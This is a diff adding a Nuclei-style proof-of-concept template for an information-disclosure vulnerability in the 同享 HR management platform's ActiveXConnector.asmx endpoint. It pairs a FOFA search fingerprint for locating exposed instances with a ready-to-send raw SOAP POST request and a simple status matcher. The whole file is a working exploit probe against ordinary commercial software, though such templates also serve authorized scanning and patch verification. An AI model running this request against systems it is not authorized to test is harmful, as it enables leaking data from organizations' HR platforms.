@@ -1,0 +1,19 @@
+id: poc-llchyvwvgx56l027
+info:
+  name: 同享人力管理管理平台ActiveXConnector.asmx信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/llchyvwvgx56l027'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: llchyvwvgx56l027
+    fofa: body="/Assistant/Default.aspx"
+http:
+- raw:
+  - "POST /Service/ActiveXConnector.asmx HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nConnection: close\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\nContent-Type: text/xml;charset=UTF-8\nContent-Length: 224\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:GetActivexConnector/>\n   </soapenv:Body>\n</soapenv:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
